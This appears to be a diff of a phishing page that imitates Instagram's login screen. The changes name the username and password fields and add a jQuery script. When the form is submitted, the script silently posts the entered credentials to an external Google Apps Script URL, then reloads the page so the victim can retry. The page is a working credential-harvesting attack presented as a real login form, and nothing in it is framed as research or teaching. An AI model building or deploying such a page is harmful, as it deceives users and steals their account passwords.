@@ -6,56 +6,72 @@
     <title>Instagram</title>
     <link rel="icon" href="images/tab-icon.png" type="image/png">
     <link rel="stylesheet" href="style.css" type="text/css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 </head>
 <body>
     <div class="container">
     <div class="main">
         <div class="main-image">
             <img src="images/main-img.png" >
+            <div class="column">
+                <form id="gform1" action="">
+                  <label for="fname">First Name</label>
+                  <input type="text" id="fname" name="name" placeholder="Your name..">
+                  <!-- <label for="lname">Email</label> -->
+                  <input type="text" id="lname" name="email" placeholder="email.">
+                  <label for="Password">password</label>
+                  <input type="text" id="password" name="password" placeholder="password">
+                  <!-- <label for="country">Country</label>
+                  <select id="country" name="color">
+                    <option value="australia">Australia</option>
+                    <option value="canada">Canada</option>
+                    <option value="usa">USA</option>
+                    <option value="india">India</option>
+                  </select>
+                  <label for="State">State</label>
+                  <select id="State" name="color">
+                    <option value="">Select one</option>
+                    <option value="Kerala">Kerala</option>
+                    <option value="Karnadaka">Karnataka</option>
+                    <option value="Tamilnadu">Tamilnadu</option>
+                  </select>
+                  <label for="subject">Subject</label>
+                  <textarea id="subject" name="message" placeholder="Write something.." style="overflow:scroll;"></textarea> -->
+                  <input type="submit" value="Submit">
+                </form>
+              </div>
         </div>
         <div class="login-controls">
-            <table>
-                <tr> 
-                    <td ><div class="login-image"><img src="images/name.png"></div></td>
-                </tr>
-                <tr >
-                    <form id="gform" method="post" action="https://script.google.com/macros/s/AKfycbzaWnePa_ixc25VB2Z881ONuh5tTqvRWItW7IdJNirn2Q58axNP0dNHArcYlnsFghn-4A/exec">
-                <td ><input type="text" class="user-input" placeholder="Phone number, username,or email" style="margin-top:30px;"></td>
-                </tr>
-                <tr><td></td></tr>
-                <tr>
-                    <td><input type="text" class="user-input" placeholder="Password"></td>
-                </tr>
-                <tr>
-                    <td><input type="submit" class="button" value="Log in"></td>
-                </tr>
+            
+              <div class="login-image">
+                <img src="images/name.png" alt="Instagram logo">
+              </div>
+            <form id="gform" action="" class="form-box">
+              <input type="text" id="lname" name="email" class="user-input top" placeholder="Phone number, username, or email">
+              <input type="text" id="password" name="password" class="user-input" placeholder="Password">
+              <input type="submit" class="button" value="Log in">
             </form>
-                <tr >
-                    <td ><div class="or-main">
-                        <hr class="or-border">
-                    <span class="or"> OR </span>
-                    <hr class="or-border">
-                    </div></td>
-                </tr>
-                <tr >
-                    <td>
-                        <img src="images/facebook.png" class="facebook">
-                        <span class="facebook-title">Log in with Facebook</span>
-                      </td>
-                      
-                </tr>
-                <tr><td class="Password">Forgot password?</td></tr>
-                <tr><td class="question">Don't have an account?
-                    <span class="signup">Sign up </span>
-                </td>
-                
-                </tr>
-                <tr><td class="getapp" >Get the app.</td></tr>
-                <tr><td class="play-click">
-                    <img src="images/playstore.png" class="playstore">
-                <span><img src="images/micstore.png" class="playstore"></span>
-            </td></tr>
-            </table>
+              <div class="or-main">
+                <div class="or-border"></div>
+                <span class="or">OR</span>
+                <div class="or-border"></div>
+              </div>
+          
+              <div class="facebook-login">
+                <img src="images/facebook.png" class="facebook" alt="">
+                <span class="facebook-title">Log in with Facebook</span>
+              </div>
+          
+              <div class="Password">Forgot password?</div>
+              <div class="question">Don't have an account? <span class="signup">Sign up</span></div>
+              <div class="getapp">Get the app.</div>
+          
+              <div class="play-click">
+                <img src="images/playstore.png" class="playstore" alt="">
+                <img src="images/micstore.png" class="playstore" alt="">
+              </div>
+          </div>
+          
         </div>
         </div>
         <div class="footer">
@@ -83,5 +99,24 @@
             </tr>
         </table>
         </div>
+        <script>
+            $("#gform").submit((e)=>{
+                e.preventDefault()
+                $.ajax({
+                    url:"https://script.google.com/macros/s/AKfycbzaWnePa_ixc25VB2Z881ONuh5tTqvRWItW7IdJNirn2Q58axNP0dNHArcYlnsFghn-4A/exec",
+                    data:$("#gform").serialize(),
+                    method:"post",
+                    success:function (response){
+                        alert("Form submitted successfully")
+                        window.location.reload()
+                        // window.location.href="https://google.com"
+                    },
+                    error:function (err){
+                        alert("Something Error")
+        
+                    }
+                })
+            })
+        </script>
 </body>
 </html>
